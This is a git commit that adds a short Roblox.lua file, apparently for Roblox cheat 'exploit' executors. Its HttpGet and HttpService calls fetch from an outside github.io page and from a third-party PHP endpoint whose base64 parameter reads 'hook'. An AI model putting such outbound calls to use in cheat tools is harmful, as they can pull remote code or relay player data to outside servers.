4aeaa19fd002758eb1149000428ce8c391c5f9df
NitroHacks <59940423+NitroHacks@users.noreply.github.com>
2020-05-26 19:01:55 +0200

    Add files via upload

---
+++ Roblox.lua
@@ -0,0 +1,6 @@
+-- Exploits
+game:HttpGet("https://nitrohacks.github.io/Crystal-Nitro/")
+-- Roblox Studio
+game:GetService("HttpService"):GetAsync("https://nitrohacks.github.io/Crystal-Nitro/")
+--Example
+game:HttpGet("https://littest.site/yeet/site.php?h=aG9vaw==")
